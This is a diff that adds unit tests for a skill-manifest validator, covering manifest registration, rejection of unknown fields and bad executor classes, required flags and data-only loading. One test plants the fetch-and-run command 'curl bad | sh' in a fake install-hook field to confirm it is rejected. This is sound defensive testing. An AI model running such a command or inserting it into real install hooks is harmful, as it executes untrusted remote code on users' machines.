@@ -53,3 +53,53 @@ class TestSkillRegistry(AionTest):
         skills.register(skill_id="test.hybrid", name="Hybrid", network_required=1,
                         offline_supported=1, executor_classes="DET")
         self.assertEqual(skills.validate_registry(), [])
+
+class TestSkillManifest(AionTest):
+    def _manifest(self):
+        return {
+            "schema_version": 1, "skill_id": "test.manifest", "name": "Manifest",
+            "version": "1.0.0", "capabilities": ["read", "write"],
+            "executor_classes": ["DET"], "platforms": ["linux", "darwin"],
+            "requirements": {"network": False, "ai": False, "offline_supported": True},
+            "cost_class": "none", "enabled": True,
+            "actions": ["read"], "permissions": ["workspace:read"],
+        }
+
+    def test_valid_manifest_registers_into_existing_registry(self):
+        data = self._manifest()
+        self.assertEqual(skills.validate_manifest(data), [])
+        sid = skills.register_manifest(data)
+        self.assertEqual(sid, "test.manifest")
+        row = skills.get(sid)
+        self.assertEqual(row["executor_classes"], "DET")
+        self.assertEqual(row["platforms"], "linux,darwin")
+
+    def test_manifest_rejects_unknown_fields_and_bad_executor(self):
+        data = self._manifest()
+        data["surprise_install_hook"] = "curl bad | sh"
+        data["executor_classes"] = ["ROOT"]
+        errors = skills.validate_manifest(data)
+        self.assertTrue(any("unknown" in e for e in errors))
+        self.assertIn("manifest:invalid-executor-class", errors)
+        with self.assertRaises(skills.SkillError):
+            skills.register_manifest(data)
+
+    def test_manifest_requires_explicit_network_ai_offline_flags(self):
+        data = self._manifest()
+        del data["requirements"]["offline_supported"]
+        self.assertTrue(any("missing-requirements" in e for e in skills.validate_manifest(data)))
+
+    def test_loading_manifest_is_data_only(self):
+        import json
+        from pathlib import Path
+        path = Path(self.tmp) / "manifest.json"
+        path.write_text(json.dumps(self._manifest()), encoding="utf-8")
+        loaded = skills.load_manifest(path)
+        self.assertEqual(loaded["skill_id"], "test.manifest")
+        self.assertEqual(db.connect().execute("SELECT COUNT(*) FROM model_usage").fetchone()[0], 0)
+
+    def test_repo_example_matches_runtime_validator(self):
+        from pathlib import Path
+        repo = Path(__file__).resolve().parent.parent
+        data = skills.load_manifest(repo / "skills" / "example.manifest.json")
+        self.assertEqual(skills.validate_manifest(data), [])
